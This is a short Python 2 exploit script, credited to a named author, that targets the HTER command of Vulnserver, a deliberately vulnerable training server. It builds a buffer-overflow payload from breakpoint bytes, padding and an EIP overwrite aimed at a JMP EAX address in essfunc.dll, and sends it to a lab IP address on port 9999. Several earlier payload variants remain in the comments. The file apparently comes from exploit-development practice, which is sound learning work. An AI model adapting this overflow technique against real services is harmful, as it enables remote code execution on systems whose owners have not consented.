#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import struct

__author__ = "f47h3r - Chase Schultz"

if __name__ == '__main__':
    usage = __doc__
    author = __author__
    version = "0.01"
    
    ## Breakpoint
    #shellcode = "B"*8
    shellcode = "cc"*8


    ## JMP EAX - In fuzzing/results/vulnserver/bin/essfunc.dll

    #eip = "B1115062"
    #eip = "2" * 2 + "115062"
    eip = "b1115062"

    print "\n\n--Vulnserver CRASHER--\n\n"

    print "Length of Shellcode:\t%d" % len(shellcode)

    print "Length of EIP:\t%d" % len(eip)

    #payload = "HTER "+"A"*4000

    ## Working Payload
    #payload = "HTER "+ "1BBBBBBBB" +"A"*(2041-9)+eip+"A"*951
    
    #Working Crash
    #payload = "HTER "+ "1"+ shellcode+"A"*(2041-9)+"2"*8+"A"*951

    payload = "HTER "+ "1"+ shellcode +"A"*((2041-1)-len(shellcode))+eip+"A"*951

    print "--Payload--\n\n%s\n\n" % payload

    print "Payload Length:\t%d" % len(payload)

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('172.16.1.129', 9999))
    
    ## Recieve Banner
    banner = client_socket.recv(512)
    print banner
    
    ## Send Payload
    client_socket.send(payload)


    #command = raw_input()
    #client_socket.send(command)
    response = client_socket.recv(512)
    print response
    client_socket.close()
